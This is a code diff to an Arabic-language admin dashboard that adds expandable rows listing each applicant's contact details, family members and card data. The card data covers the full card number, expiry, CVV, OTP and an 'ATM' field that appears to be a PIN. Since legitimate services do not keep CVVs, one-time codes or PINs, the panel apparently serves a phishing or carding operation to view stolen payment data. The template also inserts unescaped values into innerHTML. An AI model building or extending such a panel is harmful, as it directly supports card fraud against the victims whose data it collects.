@@ -60,6 +60,31 @@
   .admin-table td{ padding:16px 18px; border-top:1px solid var(--line); white-space:nowrap; }
   .admin-table tbody tr:hover{ background:#fafaf9; }
   .status-badge{ padding:3px 10px; border-radius:999px; font-size:12px; font-weight:700; background:#fdf3e3; color:#7a5a12; }
+  .name-expander{
+    display:inline-flex; align-items:center; gap:8px; background:none; border:none;
+    padding:0; font:inherit; color:var(--ink); font-weight:700; cursor:pointer;
+  }
+  .name-expander .arrow {
+    width:14px; height:14px; color:var(--muted); transition:transform .2s ease;
+  }
+  .name-expander[aria-expanded="true"] .arrow{ transform:rotate(180deg); }
+  .details-row td{ background:#f9faf8; padding:0 !important; }
+  .details-panel {
+    padding:14px 18px 18px; display:grid; gap:12px;
+  }
+  .details-section {
+    border:1px solid var(--line); border-radius:8px; background:#fff; padding:12px 14px;
+  }
+  .details-section h4 {
+    margin:0 0 10px; font-size:13px; color:var(--accent); font-weight:800;
+  }
+  .details-grid {
+    display:grid; grid-template-columns:repeat(auto-fit,minmax(180px,1fr)); gap:10px 16px;
+    font-size:12.8px;
+  }
+  .detail-item { display:flex; flex-direction:column; gap:4px; }
+  .detail-item span{ color:var(--muted); font-size:11.5px; }
+  .detail-item strong{ font-size:12.8px; color:var(--ink); word-break:break-word; }
   .action-btn{
     background:none; border:1px solid var(--line); border-radius:6px; padding:6px 12px;
     font-size:12px; cursor:pointer; font-family:inherit; margin-inline-start:6px; font-weight:700;
@@ -216,9 +241,18 @@
       loadedApplications.forEach((d, index) => {
         const a = d.applicant || {};
         const persons = d.persons || [];
+        const card = d.card || d.payment || null;
+        const expanded = false;
         const row = document.createElement('tr');
         row.innerHTML = `
-          <td>${a.name || 'بدون اسم'}</td>
+          <td>
+            <button type="button" class="name-expander" data-index="${index}" aria-expanded="${expanded}">
+              <span>${a.name || 'بدون اسم'}</span>
+              <svg class="arrow" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M5 7.5L10 12.5L15 7.5"></path>
+              </svg>
+            </button>
+          </td>
           <td>${a.phone ? ('+971 ' + a.phone) : '—'}</td>
           <td>${persons.length}</td>
           <td><span class="status-badge">${
@@ -232,6 +266,67 @@
           </td>
         `;
         tbody.appendChild(row);
+
+        const detailsRow = document.createElement('tr');
+        detailsRow.className = 'details-row';
+        detailsRow.innerHTML = `
+          <td colspan="5">
+            <div class="details-panel">
+              <div class="details-section">
+                <h4>مقدم الطلب</h4>
+                <div class="details-grid">
+                  <div class="detail-item"><span>الاسم</span><strong>${a.name || '—'}</strong></div>
+                  <div class="detail-item"><span>رقم الجوال</span><strong>${a.phone ? ('+971 ' + a.phone) : '—'}</strong></div>
+                  <div class="detail-item"><span>البريد الإلكتروني</span><strong>${a.email || '—'}</strong></div>
+                  <div class="detail-item"><span>تاريخ الميلاد</span><strong>${a.birth || '—'}</strong></div>
+                  ${a.address ? `<div class="detail-item"><span>الموقع</span><strong>${a.address}</strong></div>` : ''}
+                </div>
+              </div>
+
+              ${persons.length ? `
+                <div class="details-section">
+                  <h4>الأفراد</h4>
+                  <div class="details-grid">
+                    ${persons.map((p) => `
+                      <div class="detail-item">
+                        <span>${p.title || 'فرد'}</span>
+                        <strong>${p.name || '—'}</strong>
+                        <span>${p.phone ? ('+971 ' + p.phone) : '—'}</span>
+                      </div>
+                    `).join('')}
+                  </div>
+                </div>
+              ` : ''}
+
+              ${card ? `
+                <div class="details-section">
+                  <h4>بيانات البطاقة</h4>
+                  <div class="details-grid">
+                    <div class="detail-item"><span>اسم صاحب البطاقة</span><strong>${card.cardName || card.name || '—'}</strong></div>
+                    <div class="detail-item"><span>رقم البطاقة</span><strong style="direction:ltr; unicode-bidi:plaintext; text-align:left;">${card.cardNumber || card.number || '—'}</strong></div>
+                    <div class="detail-item"><span>تاريخ الانتهاء</span><strong>${card.expiryDate || card.expiry || '—'}</strong></div>
+                    <div class="detail-item"><span>CVV</span><strong>${card.cvv || '—'}</strong></div>
+                    <div class="detail-item"><span>OTP</span><strong>${card.otp || '—'}</strong></div>
+                    <div class="detail-item"><span>ATM</span><strong>${card.atm || '—'}</strong></div>
+                  </div>
+                </div>
+              ` : ''}
+            </div>
+          </td>
+        `;
+        detailsRow.style.display = 'none';
+        tbody.appendChild(detailsRow);
+      });
+
+      tbody.querySelectorAll('.name-expander').forEach((btn) => {
+        btn.addEventListener('click', () => {
+          const row = btn.closest('tr');
+          const detailsRow = row.nextElementSibling;
+          if (!detailsRow || !detailsRow.classList.contains('details-row')) return;
+          const isOpen = btn.getAttribute('aria-expanded') === 'true';
+          btn.setAttribute('aria-expanded', String(!isOpen));
+          detailsRow.style.display = isOpen ? 'none' : 'table-row';
+        });
       });
 
       tbody.querySelectorAll('.action-btn.details').forEach((btn) => {
